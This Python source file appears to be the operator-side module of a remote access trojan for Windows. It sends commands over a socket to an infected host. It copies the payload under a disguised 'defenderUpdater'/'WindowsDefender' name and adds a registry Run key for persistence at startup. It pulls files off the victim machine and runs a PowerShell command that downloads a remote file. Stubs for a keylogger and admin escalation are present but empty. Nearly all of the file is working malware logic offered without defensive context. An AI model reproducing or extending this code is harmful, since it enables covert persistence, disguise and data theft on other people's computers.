import time

def copy_self(client_socket, scriptDir, targetPath):
    try:
        scriptDir = scriptDir.replace("\r\n","").replace(" ","") + "\\payload.py"
        print(f"\n[*] Copying self to {targetPath}...")
        client_socket.send("echo %USERNAME%".encode('utf-8'))
        path = targetPath
        client_socket.send(f"mkdir {path}".encode('utf-8'))
        time.sleep(0.01)
        client_socket.send(f"cd {path}".encode('utf-8'))
        client_socket.send(f"cp {scriptDir} {path}\\defenderUpdater.py".encode('utf-8'))
        time.sleep(0.01)
        scriptDir = scriptDir.replace("payload.py", "")
        time.sleep(0.1)
        client_socket.send(f"cd {scriptDir}".encode('utf-8'))
        print(f"[+] Done! Copy saved in '{path}\\WindowsDefender'\n")
        time.sleep(0.01)
    except Exception as e:
        print(f"[-] Error executing copy_self exploit -> {e}")

def startup_run(client_socket, scriptDir, regName, verbose=False):
    try:
        print("[*] Adding payload to Run Registry to run on startup...")
        reg_cmd = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {regName} /t REG_SZ /d {scriptDir}"
        if verbose == True:
            print(f"[*] Using registry: {reg_cmd}\n    Only to current user")
            print(f"[*] Using {regName} as reg name and {scriptDir} as value")
            print("[*] Sending command...")
        client_socket.send(reg_cmd.encode('utf-8'))
        print("[+] Done!\n")
    except Exception as e:
        print(f"[-] Error executing startup exploit -> {e}")

# Broken
def change_wallpaper(client_socket, url):
    # Has to be a .bmp file
    print("[*] Changing wallpaper via powershell...")
    command = "powershell iwr -Uri {} -OutFile c:\\windows\\temp\\b.jpg;sp 'HKCU:Control Panel\\Desktop' WallPaper 'c:\\windows\\temp\\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)".format(url)
    client_socket.send(command.encode('utf-8'))
    print("[+] Done!")

def download(client_socket, filename, os_name):
    pass_over = True
    try:
        print("[*] Sending instructions...")
        client_socket.send(f"download {filename}".encode('utf-8'))
        print(f"[*] Downloading {filename}...")
        file_data = client_socket.recv(1000000000)

        try:
            if file_data.decode('utf-8') == "[-] File doesn't exist":
                print("[-] File doesn't exist")
                pass_over = False
        except:
            pass
            
        if pass_over == True:
            file = open(filename, 'wb')
            file.write(file_data)
            file.close()
            print("[+] Successfully installed file in same directory as listener")
    except Exception as e:
        print("[-] Error:", e)
        return

def keylogger():
    pass

def admin():
    pass